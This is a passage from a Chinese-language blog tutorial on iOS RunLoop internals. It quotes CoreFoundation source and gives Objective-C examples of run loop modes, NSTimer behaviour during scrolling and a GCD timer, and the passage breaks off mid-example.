（基于CFRunLoopRef的封装） <br>NSRunLoop对象</p><p>CoreFoundation <br>CFRunLoopRef对象</p><p>因为Fundation框架是基于CFRunLoopRef的一层OC封装，这里我主要研究CFRunLoopRef源码</p><h3 id="如何获得RunLoop对象"><a href="#如何获得RunLoop对象" class="headerlink" title="如何获得RunLoop对象"></a>如何获得RunLoop对象</h3><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Foundation</span><br><span class="line">    [<span class="built_in">NSRunLoop</span> currentRunLoop]; <span class="comment">// 获得当前线程的RunLoop对象</span></span><br><span class="line">    [<span class="built_in">NSRunLoop</span> mainRunLoop]; <span class="comment">// 获得主线程的RunLoop对象</span></span><br><span class="line">    </span><br><span class="line">    Core Foundation</span><br><span class="line">    <span class="built_in">CFRunLoopGetCurrent</span>(); <span class="comment">// 获得当前线程的RunLoop对象</span></span><br><span class="line">    <span class="built_in">CFRunLoopGetMain</span>(); <span class="comment">// 获得主线程的RunLoop对象</span></span><br></pre></td></tr></table></figure><h1 id="五-RunLoop和线程间的关系"><a href="#五-RunLoop和线程间的关系" class="headerlink" title="五. RunLoop和线程间的关系"></a>五. RunLoop和线程间的关系</h1><ol><li>每条线程都有唯一的一个与之对应的RunLoop对象</li><li>RunLoop保存在一个全局的Dictionary里，线程作为key,RunLoop作为value</li><li>主线程的RunLoop已经自动创建好了，子线程的RunLoop需要主动创建</li><li>RunLoop在第一次获取时创建，在线程结束时销毁</li></ol><h3 id="通过源码查看上述对应"><a href="#通过源码查看上述对应" class="headerlink" title="通过源码查看上述对应"></a>通过源码查看上述对应</h3><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拿到当前Runloop 调用_CFRunLoopGet0</span></span><br><span class="line">    <span class="built_in">CFRunLoopRef</span> <span class="built_in">CFRunLoopGetCurrent</span>(<span class="type">void</span>) &#123;</span><br><span class="line">        CHECK_FOR_FORK();</span><br><span class="line">        <span class="built_in">CFRunLoopRef</span> rl = (<span class="built_in">CFRunLoopRef</span>)_CFGetTSD(__CFTSDKeyRunLoop);</span><br><span class="line">        <span class="keyword">if</span> (rl) <span class="keyword">return</span> rl;</span><br><span class="line">        <span class="keyword">return</span> _CFRunLoopGet0(pthread_self());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 查看_CFRunLoopGet0方法内部</span></span><br><span class="line">    <span class="built_in">CF_EXPORT</span> <span class="built_in">CFRunLoopRef</span> _CFRunLoopGet0(pthread_t t) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pthread_equal(t, kNilPthreadT)) &#123;</span><br><span class="line">        t = pthread_main_thread_np();</span><br><span class="line">        &#125;</span><br><span class="line">        __CFLock(&amp;loopsLock);</span><br><span class="line">        <span class="keyword">if</span> (!__CFRunLoops) &#123;</span><br><span class="line">            __CFUnlock(&amp;loopsLock);</span><br><span class="line">        <span class="built_in">CFMutableDictionaryRef</span> dict = <span class="built_in">CFDictionaryCreateMutable</span>(kCFAllocatorSystemDefault, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;kCFTypeDictionaryValueCallBacks);</span><br><span class="line">        <span class="comment">// 根据传入的主线程获取主线程对应的RunLoop</span></span><br><span class="line">        <span class="built_in">CFRunLoopRef</span> mainLoop = __CFRunLoopCreate(pthread_main_thread_np());</span><br><span class="line">        <span class="comment">// 保存主线程 将主线程-key和RunLoop-Value保存到字典中</span></span><br><span class="line">        <span class="built_in">CFDictionarySetValue</span>(dict, pthreadPointer(pthread_main_thread_np()), mainLoop);</span><br><span class="line">        <span class="keyword">if</span> (!OSAtomicCompareAndSwapPtrBarrier(<span class="literal">NULL</span>, dict, (<span class="type">void</span> * <span class="keyword">volatile</span> *)&amp;__CFRunLoops)) &#123;</span><br><span class="line">            <span class="built_in">CFRelease</span>(dict);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">CFRelease</span>(mainLoop);</span><br><span class="line">            __CFLock(&amp;loopsLock);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 从字典里面拿，将线程作为key从字典里获取一个loop</span></span><br><span class="line">        <span class="built_in">CFRunLoopRef</span> loop = (<span class="built_in">CFRunLoopRef</span>)<span class="built_in">CFDictionaryGetValue</span>(__CFRunLoops, pthreadPointer(t));</span><br><span class="line">        __CFUnlock(&amp;loopsLock);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果loop为空，则创建一个新的loop，所以runloop会在第一次获取的时候创建</span></span><br><span class="line">        <span class="keyword">if</span> (!loop) &#123;  </span><br><span class="line">        <span class="built_in">CFRunLoopRef</span> newLoop = __CFRunLoopCreate(t);</span><br><span class="line">            __CFLock(&amp;loopsLock);</span><br><span class="line">        loop = (<span class="built_in">CFRunLoopRef</span>)<span class="built_in">CFDictionaryGetValue</span>(__CFRunLoops, pthreadPointer(t));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建好之后，以线程为key runloop为value，一对一存储在字典中，下次获取的时候，则直接返回字典内的runloop</span></span><br><span class="line">        <span class="keyword">if</span> (!loop) &#123; </span><br><span class="line">            <span class="built_in">CFDictionarySetValue</span>(__CFRunLoops, pthreadPointer(t), newLoop);</span><br><span class="line">            loop = newLoop;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="comment">// don&#x27;t release run loops inside the loopsLock, because CFRunLoopDeallocate may end up taking it</span></span><br><span class="line">            __CFUnlock(&amp;loopsLock);</span><br><span class="line">        <span class="built_in">CFRelease</span>(newLoop);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pthread_equal(t, pthread_self())) &#123;</span><br><span class="line">            _CFSetTSD(__CFTSDKeyRunLoop, (<span class="type">void</span> *)loop, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> == _CFGetTSD(__CFTSDKeyRunLoopCntr)) &#123;</span><br><span class="line">                _CFSetTSD(__CFTSDKeyRunLoopCntr, (<span class="type">void</span> *)(PTHREAD_DESTRUCTOR_ITERATIONS<span class="number">-1</span>), (<span class="type">void</span> (*)(<span class="type">void</span> *))__CFFinalizeRunLoop);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> loop;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>从上面的代码看出线程和 RunLoop 之间是一一对应的，其关系是保存在一个 Dictionary 里。所以我们创建子线程RunLoop时，只需在子线程中获取当前线程的RunLoop对象即可[NSRunLoop currentRunLoop];如果不获取，那子线程就不会创建与之相关联的RunLoop，并且只能在一个线程的内部获取其 RunLoop [NSRunLoop currentRunLoop];方法调用时，会先看一下字典里有没有存子线程相对用的RunLoop，如果有则直接返回RunLoop，如果没有则会创建一个，并将与之对应的子线程存入字典中。当线程结束时，RunLoop会被销毁。</p><h1 id="六-RunLoop结构体"><a href="#六-RunLoop结构体" class="headerlink" title="六. RunLoop结构体"></a>六. RunLoop结构体</h1><p>通过源码找到<strong>CFRunLoop结构体<br><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> __CFRunLoop &#123;</span><br><span class="line">        <span class="built_in">CFRuntimeBase</span> _base;</span><br><span class="line">        pthread_mutex_t _lock;          <span class="comment">/* locked for accessing mode list */</span></span><br><span class="line">        __CFPort _wakeUpPort;           <span class="comment">// used for CFRunLoopWakeUp </span></span><br><span class="line">        Boolean _unused;</span><br><span class="line">        <span class="keyword">volatile</span> _per_run_data *_perRunData;              <span class="comment">// reset for runs of the run loop</span></span><br><span class="line">        pthread_t _pthread;</span><br><span class="line">        uint32_t _winthread;</span><br><span class="line">        <span class="built_in">CFMutableSetRef</span> _commonModes;</span><br><span class="line">        <span class="built_in">CFMutableSetRef</span> _commonModeItems;</span><br><span class="line">        <span class="built_in">CFRunLoopModeRef</span> _currentMode;</span><br><span class="line">        <span class="built_in">CFMutableSetRef</span> _modes;</span><br><span class="line">        <span class="keyword">struct</span> _block_item *_blocks_head;</span><br><span class="line">        <span class="keyword">struct</span> _block_item *_blocks_tail;</span><br><span class="line">        <span class="built_in">CFAbsoluteTime</span> _runTime;</span><br><span class="line">        <span class="built_in">CFAbsoluteTime</span> _sleepTime;</span><br><span class="line">        <span class="built_in">CFTypeRef</span> _counterpart;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><br>除一些记录性属性外，主要来看一下以下两个成员变量<br><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CFRunLoopModeRef</span> _currentMode;</span><br><span class="line">    <span class="built_in">CFMutableSetRef</span> _modes;</span><br></pre></td></tr></table></figure><br>CFRunLoopModeRef 其实是指向</strong>CFRunLoopMode结构体的指针__CFRunLoopMode结构体源码如下</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> __CFRunLoopMode *<span class="built_in">CFRunLoopModeRef</span>;</span><br><span class="line">    <span class="keyword">struct</span> __CFRunLoopMode &#123;</span><br><span class="line">        <span class="built_in">CFRuntimeBase</span> _base;</span><br><span class="line">        pthread_mutex_t _lock;  <span class="comment">/* must have the run loop locked before locking this */</span></span><br><span class="line">        <span class="built_in">CFStringRef</span> _name;</span><br><span class="line">        Boolean _stopped;</span><br><span class="line">        <span class="type">char</span> _padding[<span class="number">3</span>];</span><br><span class="line">        <span class="built_in">CFMutableSetRef</span> _sources0;</span><br><span class="line">        <span class="built_in">CFMutableSetRef</span> _sources1;</span><br><span class="line">        <span class="built_in">CFMutableArrayRef</span> _observers;</span><br><span class="line">        <span class="built_in">CFMutableArrayRef</span> _timers;</span><br><span class="line">        <span class="built_in">CFMutableDictionaryRef</span> _portToV1SourceMap;</span><br><span class="line">        __CFPortSet _portSet;</span><br><span class="line">        <span class="built_in">CFIndex</span> _observerMask;</span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> USE_DISPATCH_SOURCE_FOR_TIMERS</span></span><br><span class="line">        dispatch_source_t _timerSource;</span><br><span class="line">        <span class="built_in">dispatch_queue_t</span> _queue;</span><br><span class="line">        Boolean _timerFired; <span class="comment">// set to true by the source when a timer has fired</span></span><br><span class="line">        Boolean _dispatchTimerArmed;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> USE_MK_TIMER_TOO</span></span><br><span class="line">        mach_port_t _timerPort;</span><br><span class="line">        Boolean _mkTimerArmed;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> DEPLOYMENT_TARGET_WINDOWS</span></span><br><span class="line">        DWORD _msgQMask;</span><br><span class="line">        <span class="type">void</span> (*_msgPump)(<span class="type">void</span>);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        uint64_t _timerSoftDeadline; <span class="comment">/* TSR */</span></span><br><span class="line">        uint64_t _timerHardDeadline; <span class="comment">/* TSR */</span></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>主要查看以下成员变量<br><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CFMutableSetRef</span> _sources0;</span><br><span class="line">    <span class="built_in">CFMutableSetRef</span> _sources1;</span><br><span class="line">    <span class="built_in">CFMutableArrayRef</span> _observers;</span><br><span class="line">    <span class="built_in">CFMutableArrayRef</span> _timers;</span><br></pre></td></tr></table></figure><br>通过上面分析知道CFRunLoopModeRef代表RunLoop的运行模式，一个RunLoop包含若干个Mode，每个Mode又包含若干个Source0/Source1/Timer/Observer，而RunLoop启动时只能选择其中一个Mode作为currentMode。</p><h2 id="Source1-Source0-Timers-Observer分别代表什么"><a href="#Source1-Source0-Timers-Observer分别代表什么" class="headerlink" title="Source1/Source0/Timers/Observer分别代表什么?"></a>Source1/Source0/Timers/Observer分别代表什么?</h2><ol><li>Source1 : 基于Port的线程间通信</li><li>Source0 : 触摸事件，PerformSelectors</li></ol><p>通过代码验证一下<br><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">void</span>)touchesBegan:(<span class="built_in">NSSet</span>&lt;<span class="built_in">UITouch</span> *&gt; *)touches withEvent:(<span class="built_in">UIEvent</span> *)event</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;点击了屏幕&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>打断点之后打印堆栈信息，当xcode工具区打印的堆栈信息不全时，可以在控制台通过“bt”指令打印完整的堆栈信息，由堆栈信息中可以发现，触摸事件确实是会触发Source0事件。</p><p>touchesBegan堆栈信息<br>同样的方式验证performSelector堆栈信息<br><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dispatch_async</span>(dispatch_get_global_queue(<span class="number">0</span>, <span class="number">0</span>), ^&#123;</span><br><span class="line">        [<span class="keyword">self</span> performSelectorOnMainThread:<span class="keyword">@selector</span>(test) withObject:<span class="literal">nil</span> waitUntilDone:<span class="literal">YES</span>];</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><br>可以发现PerformSelectors同样是触发Source0事件</p><p>performSelector堆栈信息</p><h3 id="3-Timers-定时器，NSTimer"><a href="#3-Timers-定时器，NSTimer" class="headerlink" title="3. Timers : 定时器，NSTimer"></a>3. Timers : 定时器，NSTimer</h3><p>通过代码验证<br><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">NSTimer</span> scheduledTimerWithTimeInterval:<span class="number">3.0</span> repeats:<span class="literal">NO</span> block:^(<span class="built_in">NSTimer</span> * _Nonnull timer) &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;NSTimer ---- timer调用了&quot;</span>);</span><br><span class="line">    &#125;];</span><br></pre></td></tr></table></figure><br>打印完整堆栈信息</p><p>Timer对战信息</p><h3 id="4-Observer-监听器，用于监听RunLoop的状态"><a href="#4-Observer-监听器，用于监听RunLoop的状态" class="headerlink" title="4. Observer : 监听器，用于监听RunLoop的状态"></a>4. Observer : 监听器，用于监听RunLoop的状态</h3><h1 id="七-详细说明一下RunLoop相关类及作用"><a href="#七-详细说明一下RunLoop相关类及作用" class="headerlink" title="七. 详细说明一下RunLoop相关类及作用"></a>七. 详细说明一下RunLoop相关类及作用</h1><p>通过上面的分析，我们对RunLoop内部结构有了大致的了解，接下来来详细分析RunLoop的相关类。以下为Core Foundation中关于RunLoop的5个类</p><h4 id="CFRunLoopRef-获得当前RunLoop和主RunLoop"><a href="#CFRunLoopRef-获得当前RunLoop和主RunLoop" class="headerlink" title="CFRunLoopRef - 获得当前RunLoop和主RunLoop"></a>CFRunLoopRef - 获得当前RunLoop和主RunLoop</h4><h4 id="CFRunLoopModeRef-RunLoop-运行模式，只能选择一种，在不同模式中做不同的操作"><a href="#CFRunLoopModeRef-RunLoop-运行模式，只能选择一种，在不同模式中做不同的操作" class="headerlink" title="CFRunLoopModeRef - RunLoop 运行模式，只能选择一种，在不同模式中做不同的操作"></a>CFRunLoopModeRef - RunLoop 运行模式，只能选择一种，在不同模式中做不同的操作</h4><h4 id="CFRunLoopSourceRef-事件源，输入源"><a href="#CFRunLoopSourceRef-事件源，输入源" class="headerlink" title="CFRunLoopSourceRef - 事件源，输入源"></a>CFRunLoopSourceRef - 事件源，输入源</h4><h4 id="CFRunLoopTimerRef-定时器时间"><a href="#CFRunLoopTimerRef-定时器时间" class="headerlink" title="CFRunLoopTimerRef - 定时器时间"></a>CFRunLoopTimerRef - 定时器时间</h4><h4 id="CFRunLoopObserverRef-观察者"><a href="#CFRunLoopObserverRef-观察者" class="headerlink" title="CFRunLoopObserverRef - 观察者"></a>CFRunLoopObserverRef - 观察者</h4><h3 id="1-CFRunLoopModeRef"><a href="#1-CFRunLoopModeRef" class="headerlink" title="1. CFRunLoopModeRef"></a>1. CFRunLoopModeRef</h3><p>CFRunLoopModeRef代表RunLoop的运行模式 一个 RunLoop 包含若干个 Mode，每个Mode又包含若干个Source、Timer、Observer 每次RunLoop启动时，只能指定其中一个 Mode，这个Mode被称作 CurrentMode 如果需要切换Mode，只能退出RunLoop，再重新指定一个Mode进入，这样做主要是为了分隔开不同组的Source、Timer、Observer，让其互不影响。如果Mode里没有任何Source0/Source1/Timer/Observer，RunLoop会立马退出 如图所示：<br><img src="https://s2.loli.net/2022/07/20/UXweM1IboQ53Cdk.png" alt="CFRunLoopModeRef示意图"></p><h6 id="注意：一种Mode中可以有多个Source-事件源，输入源，基于端口事件源例键盘触摸等-Observer-观察者，观察当前RunLoop运行状态-和Timer-定时器事件源-。但是必须至少有一个Source或者Timer，因为如果Mode为空，RunLoop运行到空模式不会进行空转，就会立刻退出。"><a href="#注意：一种Mode中可以有多个Source-事件源，输入源，基于端口事件源例键盘触摸等-Observer-观察者，观察当前RunLoop运行状态-和Timer-定时器事件源-。但是必须至少有一个Source或者Timer，因为如果Mode为空，RunLoop运行到空模式不会进行空转，就会立刻退出。" class="headerlink" title="注意：一种Mode中可以有多个Source(事件源，输入源，基于端口事件源例键盘触摸等) Observer(观察者，观察当前RunLoop运行状态) 和Timer(定时器事件源)。但是必须至少有一个Source或者Timer，因为如果Mode为空，RunLoop运行到空模式不会进行空转，就会立刻退出。"></a>注意：一种Mode中可以有多个Source(事件源，输入源，基于端口事件源例键盘触摸等) Observer(观察者，观察当前RunLoop运行状态) 和Timer(定时器事件源)。但是必须至少有一个Source或者Timer，因为如果Mode为空，RunLoop运行到空模式不会进行空转，就会立刻退出。</h6><h4 id="系统默认注册的5个Mode"><a href="#系统默认注册的5个Mode" class="headerlink" title="系统默认注册的5个Mode:"></a>系统默认注册的5个Mode:</h4><p>RunLoop 有五种运行模式，其中常见的有1.2两种</p><ol><li>kCFRunLoopDefaultMode：App的默认Mode，通常主线程是在这个Mode下运行</li><li>UITrackingRunLoopMode：界面跟踪 Mode，用于 ScrollView 追踪触摸滑动，保证界面滑动时不受其他 Mode 影响</li><li>UIInitializationRunLoopMode: 在刚启动 App 时第进入的第一个 Mode，启动完成后就不再使用，会切换到kCFRunLoopDefaultMode</li><li>GSEventReceiveRunLoopMode: 接受系统事件的内部 Mode，通常用不到</li><li>kCFRunLoopCommonModes: 这是一个占位用的Mode，作为标记kCFRunLoopDefaultMode和UITrackingRunLoopMode用，并不是一种真正的Mode </li></ol><h4 id="Mode间的切换"><a href="#Mode间的切换" class="headerlink" title="Mode间的切换"></a>Mode间的切换</h4><p>平时在开发中遇到过当使用NSTimer每一段时间执行一些事情时滑动UIScrollView，NSTimer就会暂停，当我们停止滑动以后，NSTimer又会重新恢复的情况，通过一段代码来看一下<br><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">-(<span class="type">void</span>)touchesBegan:(<span class="built_in">NSSet</span>&lt;<span class="built_in">UITouch</span> *&gt; *)touches withEvent:(<span class="built_in">UIEvent</span> *)event</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// [NSTimer scheduledTimerWithTimeInterval:2.0 target:self selector:@selector(show) userInfo:nil repeats:YES];</span></span><br><span class="line">        <span class="built_in">NSTimer</span> *timer = [<span class="built_in">NSTimer</span> timerWithTimeInterval:<span class="number">2.0</span> target:<span class="keyword">self</span> selector:<span class="keyword">@selector</span>(show) userInfo:<span class="literal">nil</span> repeats:<span class="literal">YES</span>];</span><br><span class="line">        <span class="comment">// 加入到RunLoop中才可以运行</span></span><br><span class="line">        <span class="comment">// 1. 把定时器添加到RunLoop中，并且选择默认运行模式NSDefaultRunLoopMode = kCFRunLoopDefaultMode</span></span><br><span class="line">        <span class="comment">// [[NSRunLoop mainRunLoop] addTimer:timer forMode:NSDefaultRunLoopMode];</span></span><br><span class="line">        <span class="comment">// 当textFiled滑动的时候，timer失效，停止滑动时，timer恢复</span></span><br><span class="line">        <span class="comment">// 原因：当textFiled滑动的时候，RunLoop的Mode会自动切换成UITrackingRunLoopMode模式，因此timer失效，当停止滑动，RunLoop又会切换回NSDefaultRunLoopMode模式，因此timer又会重新启动了</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 当我们将timer添加到UITrackingRunLoopMode模式中，此时只有我们在滑动textField时timer才会运行</span></span><br><span class="line">        <span class="comment">// [[NSRunLoop mainRunLoop] addTimer:timer forMode:UITrackingRunLoopMode];</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. 那个如何让timer在两个模式下都可以运行呢？</span></span><br><span class="line">        <span class="comment">// 3.1 在两个模式下都添加timer 是可以的，但是timer添加了两次，并不是同一个timer</span></span><br><span class="line">        <span class="comment">// 3.2 使用站位的运行模式 NSRunLoopCommonModes标记，凡是被打上NSRunLoopCommonModes标记的都可以运行，下面两种模式被打上标签</span></span><br><span class="line">        <span class="comment">//0 : &lt;CFString 0x10b7fe210 [0x10a8c7a40]&gt;&#123;contents = &quot;UITrackingRunLoopMode&quot;&#125;</span></span><br><span class="line">        <span class="comment">//2 : &lt;CFString 0x10a8e85e0 [0x10a8c7a40]&gt;&#123;contents = &quot;kCFRunLoopDefaultMode&quot;&#125;</span></span><br><span class="line">        <span class="comment">// 因此也就是说如果我们使用NSRunLoopCommonModes，timer可以在UITrackingRunLoopMode，kCFRunLoopDefaultMode两种模式下运行</span></span><br><span class="line">        [[<span class="built_in">NSRunLoop</span> mainRunLoop] addTimer:timer forMode:<span class="built_in">NSRunLoopCommonModes</span>];</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;%@&quot;</span>,[<span class="built_in">NSRunLoop</span> mainRunLoop]);</span><br><span class="line">    &#125;</span><br><span class="line">    -(<span class="type">void</span>)show</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;-------&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>由上述代码可以看出，NSTimer不管用是因为Mode的切换，因为如果在主线程使用定时器，此时RunLoop的Mode为kCFRunLoopDefaultMode，即定时器属于kCFRunLoopDefaultMode，那么此时我们滑动ScrollView时，RunLoop的Mode会切换到UITrackingRunLoopMode，因此在主线程的定时器就不在管用了，调用的方法也就不再执行了，当停止滑动时，RunLoop的Mode切换回kCFRunLoopDefaultMode，所以NSTimer就又管用了。</p><p>同样道理的还有ImageView的显示.</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-(<span class="type">void</span>)touchesBegan:(<span class="built_in">NSSet</span>&lt;<span class="built_in">UITouch</span> *&gt; *)touches withEvent:(<span class="built_in">UIEvent</span> *)event</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;%s&quot;</span>,__func__);</span><br><span class="line">        <span class="comment">// performSelector默认是在default模式下运行，因此在滑动ScrollView时，图片不会加载</span></span><br><span class="line">        <span class="comment">// [self.imageView performSelector:@selector(setImage:) withObject:[UIImage imageNamed:@&quot;abc&quot;] afterDelay:2.0 ];</span></span><br><span class="line">        <span class="comment">// inModes: 传入Mode数组</span></span><br><span class="line">        [<span class="keyword">self</span>.imageView performSelector:<span class="keyword">@selector</span>(setImage:) withObject:[<span class="built_in">UIImage</span> imageNamed:<span class="string">@&quot;abc&quot;</span>] afterDelay:<span class="number">2.0</span> inModes:@[<span class="built_in">NSDefaultRunLoopMode</span>,<span class="built_in">UITrackingRunLoopMode</span>]];</span><br></pre></td></tr></table></figure><h5 id="使用GCD也可是创建计时器，而且更为精确我们来看一下代码"><a href="#使用GCD也可是创建计时器，而且更为精确我们来看一下代码" class="headerlink" title="使用GCD也可是创建计时器，而且更为精确我们来看一下代码"></a>使用GCD也可是创建计时器，而且更为精确我们来看一下代码</h5><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">-(<span class="type">void</span>)touchesBegan:(<span class="built_in">NSSet</span>&lt;<span class="built_in">UITouch</span> *&gt; *)touches withEvent:(<span class="built_in">UIEvent</span> *)event</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//创建队列</span></span><br><span class="line">        <span class="built_in">dispatch_queue_t</span> queue = dispatch_get_global_queue(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//1.创建一个GCD定时器</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         第一个参数:表明创建的是一个定时器</span></span><br><span class="line"><span class="comment">         第四个参数:队列</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        dispatch_source_t timer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, <span class="number">0</span>, <span class="number">0</span>, queue);</span><br><span class="line">        <span class="comment">// 需要对timer进行强引用，保证其不会被释放掉，才会按时调用block块</span></span><br><span class="line">        <span class="comment">// 局部变量，让指针强引用</span></span><br><span class="line">        <span class="keyword">self</span>.timer = timer;</span><br><span class="line">        <span class="comment">//2.设置定时器的开始时间,间隔时间,精准度</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         第1个参数:要给哪个定时器设置</span></span><br><span class="line"><span class="comment">         第2个参数:开始时间</span></span><br><span class="line"><span class="comment">         第3个参数:间隔时间</span></span><br><span class="line"><span class="comment">         第4个参数:精准度 一般为0 